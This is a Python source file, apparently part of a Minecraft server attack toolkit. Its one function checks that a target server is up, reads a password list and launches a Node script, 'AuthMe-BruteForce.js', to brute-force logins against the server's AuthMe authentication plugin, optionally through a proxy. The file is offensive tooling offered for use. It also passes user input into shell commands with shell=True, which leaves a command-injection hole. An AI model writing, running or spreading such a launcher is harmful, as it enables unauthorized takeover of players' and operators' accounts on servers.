
import subprocess

from utils.checks.Encoding import check_encoding
from utils.color.TextColor import paint
from utils.gets.Language import language
from utils.managers.Settings import SettingsManager
from utils.minecraft.ServerData import mcstatus


def authme_command(server, username, version, password_file, proxy=None):
    """
    Run the AuthMe-BruteForce.js script to bruteforce the server 
    authentication plugin (for example, AuthMe).

    Parameters:
    server (str): IP address and port of the server.
    username (str): Bot username.
    version (str): Minecraft server version
    password_file (str): Password file.
    proxy (str): Optional proxy to use for the bot.
    """

    sm = SettingsManager()
    settings = sm.read('settings')

    try:
        if mcstatus(server) is None:
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["INVALID_ARGUMENTS"]["INVALID_SERVER"]}')
            return

        with open(password_file, 'r', encoding=check_encoding(password_file)) as f:
            passwords = f.readlines()

        if len(passwords) == 0:
            paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["authme"]["EMPTY_FILE"]}')
            return

        paint(f'\n    {language["script"]["PREFIX"]}{language["commands"]["authme"]["STARTING_THE_ATTACK"]}')
        server = server.split(':')

        if proxy is not None:
            proxy = proxy.split(':')
            subprocess.run(f'{settings["NODE_COMMAND"]} utils/scripts/AuthMe-BruteForce.js {server[0]} {server[1]} {username} {version} {password_file} {settings["LANGUAGE"]} {proxy[0]} {proxy[1]}', shell=True)

        else:
            subprocess.run(f'{settings["NODE_COMMAND"]} utils/scripts/AuthMe-BruteForce.js {server[0]} {server[1]} {username} {version} {password_file} {settings["LANGUAGE"]}', shell=True)
        
    except KeyboardInterrupt:
        return